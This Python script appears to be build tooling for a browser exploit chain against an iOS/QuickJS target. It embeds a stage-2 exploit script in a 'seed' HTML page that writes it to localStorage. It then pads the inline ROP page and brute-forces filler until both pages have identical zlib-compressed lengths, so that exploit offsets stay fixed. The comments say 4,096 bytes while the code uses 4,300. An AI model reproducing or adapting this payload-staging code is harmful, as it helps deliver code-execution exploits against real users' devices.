#!/usr/bin/env python3
"""Build the exact-length pair for the inline ROP: seed and exploit both at
4,096 uncompressed / the same compressed length (the inline's zlib), so the
preserve-length rewrite keeps the t7 value/offsets identical."""
import hashlib, json, os, random, zlib
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE); PAY=os.path.join(LAB,'payload')
B=open(os.path.join(LAB,'..','qjs_postsnapshot','ios_n1','payload','n1ios_stage2_ab72.js')).read()
LIT=json.dumps(B)
base=('<div id="v">N1IOS_SEED_INLINE</div><script>try{var B='+LIT+
      ';localStorage.setItem("n1s2",B);document.getElementById("v").textContent="SEED OK "+B.length}'
      'catch(e){document.getElementById("v").textContent="SEED ERR "+e}</script>')
# 1) pad the inline to 4096 with a compressible comment
inline=open(os.path.join(PAY,'ls_final_inline_h200_ios.html')).read()
pad=4300-len(inline)-len('\n<!--')-len('-->')
assert pad>=0, (len(inline),pad)
inline2=inline+'\n<!--'+'A'*pad+'-->'
z=len(zlib.compress(inline2.encode(),9))
print('inline 4096 zlib',z)
open(os.path.join(PAY,'ls_final_inline_h200_ios_4300.html'),'w').write(inline2)
# 2) seed 4096, compressed == z
TARGET=4300; ov=len('\n<!--')+len('-->')
body_len=TARGET-len(base)-ov
print('seed base',len(base),'body',body_len,'target z',z)
alpha='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
def build(body): return base+'\n<!--'+body+'-->'
def zl(body): return len(zlib.compress(build(body).encode(),9))
found=None
for r in range(0,body_len+1):
    for seed in range(0,20):
        rng=random.Random(seed*1315423911+r)
        body=''.join(rng.choice(alpha) for _ in range(r))+'A'*(body_len-r)
        zz=zl(body)
        if found is None or abs(zz-z)<abs(found[0]-z): found=(zz,r,seed,body)
        if zz==z:
            print('FOUND',r,seed,zz); found=(zz,r,seed,body); break
    if found and found[0]==z: break
if not found or found[0]!=z:
    print('no exact, best',found[0] if found else None)
    for r in range(body_len,-1,-1):
        for seed in range(0,300):
            rng=random.Random(seed*2654435761+r)
            body=''.join(rng.choice(alpha) for _ in range(r))+'A'*(body_len-r)
            if zl(body)==z:
                found=(z,r,seed,body); print('FOUND2',r,seed); break
        if found and found[0]==z: break
assert found and found[0]==z, 'cannot tune seed to inline z'
h=build(found[3]); open(os.path.join(PAY,'ls_seed_inline_4300.html'),'w').write(h)
print('seed raw',len(h),'zlib9',len(zlib.compress(h.encode(),9)),'sha',hashlib.sha256(h.encode()).hexdigest())
print('inline raw',len(inline2),'zlib9',z,'sha',hashlib.sha256(inline2.encode()).hexdigest())
